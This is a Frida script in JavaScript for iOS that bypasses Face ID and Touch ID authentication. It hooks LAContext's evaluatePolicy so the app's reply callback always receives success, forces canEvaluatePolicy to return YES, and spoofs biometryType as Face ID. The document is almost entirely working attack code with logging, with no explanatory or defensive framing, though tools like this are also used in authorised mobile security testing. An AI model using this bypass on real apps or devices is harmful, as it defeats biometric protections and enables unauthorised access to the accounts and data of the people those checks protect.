// Biometric Authentication Bypass for iOS
// Hooks Face ID and Touch ID authentication

// Hook LAContext evaluatePolicy (main biometric auth method)
var LAContext = ObjC.classes.LAContext;
if (LAContext) {
    Interceptor.attach(
        LAContext['- evaluatePolicy:localizedReason:reply:'].implementation,
        {
            onEnter: function(args) {
                console.log('[*] Biometric auth intercepted');
                console.log('[*] Policy: ' + args[2]);
                console.log('[*] Reason: ' + ObjC.Object(args[3]).toString());

                // Force success callback
                var reply = new ObjC.Block(args[4]);
                var originalImpl = reply.implementation;

                reply.implementation = function(success, error) {
                    console.log('[+] Forcing biometric auth success');
                    originalImpl(true, null); // Success, no error
                };
            }
        }
    );
}

// Hook canEvaluatePolicy (checks if biometric auth is available)
if (LAContext) {
    Interceptor.attach(
        LAContext['- canEvaluatePolicy:error:'].implementation,
        {
            onEnter: function(args) {
                console.log('[*] canEvaluatePolicy intercepted');
            },
            onLeave: function(retval) {
                console.log('[+] Forcing canEvaluatePolicy to return YES');
                retval.replace(1); // Return YES
            }
        }
    );
}

// Hook biometryType (returns type of biometric auth available)
if (LAContext) {
    var biometryType = LAContext['- biometryType'];
    if (biometryType) {
        Interceptor.attach(
            biometryType.implementation,
            {
                onLeave: function(retval) {
                    console.log('[+] Forcing biometryType to LABiometryTypeFaceID (2)');
                    retval.replace(2); // LABiometryTypeFaceID
                }
            }
        );
    }
}

console.log('[+] Biometric auth bypass active');
